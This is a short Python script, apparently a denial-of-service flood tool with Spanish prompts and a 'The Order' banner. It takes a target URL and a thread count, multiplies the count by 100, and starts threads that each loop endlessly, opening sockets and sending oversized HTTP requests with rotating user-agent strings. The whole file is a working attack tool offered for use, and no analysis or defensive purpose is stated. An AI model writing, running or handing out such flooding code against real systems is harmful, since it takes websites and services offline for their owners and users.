import socket
import threading
import random

print('''
░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓
  ░▒▓█████▓▒░   ██████      █████▓▒░
     █          █    █          █
     █          █    █          █
     █████      █    █       ████
         █      █    █          █
         █      █    █          █
     █████      ██████       ████ 
▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░▓▒░     
     Codigo por The Order
''')

useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 YaBrowser/22.2.0.1469 Yowser/2.5 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Edge/97.0.1072.71",
    "Mozilla/5.0 (Linux; Android 11; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

def starturl():
    global url, url2, urlport

    url = input("Ingresa URL/IP: ejemplo( https://google.com): ").strip()

    if not url:
        print("Por favor, ingresa la URL.")
        starturl()

    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    url_components = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")
    url2 = url_components[0]
    urlport = url_components[1] if len(url_components) > 1 else "80"

    numthreads()

def numthreads():
    try:
        n = int(input("Número de hilos (recomendado 800): "))
        n = n * 100
        if n <= 0:
            print("El número de hilos debe ser mayor que cero.")
            numthreads()
        else:
            for i in range(n):
                threading.Thread(target=dos).start()


    except ValueError:
        print("Por favor, ingresa un número válido.")
        numthreads()

def dos():
    payload = "X" * 10000  # Payload grande para incrementar el tamaño del paquete
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((url2, int(urlport)))
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {url2}\r\n"
                f"User-Agent: {random.choice(useragents)}\r\n"
                f"Content-Length: {len(payload)}\r\n\r\n"
                f"{payload}"
            )
            s.send(request.encode('ascii'))
            print("\033[92m[+] Enviando ataque con paquete pesado >:)\033[0m")
        except Exception as e:
            s.close()
            print("\033[93m[-] El servidor está teniendo problemas!\033[0m")

if __name__ == "__main__":
    starturl()
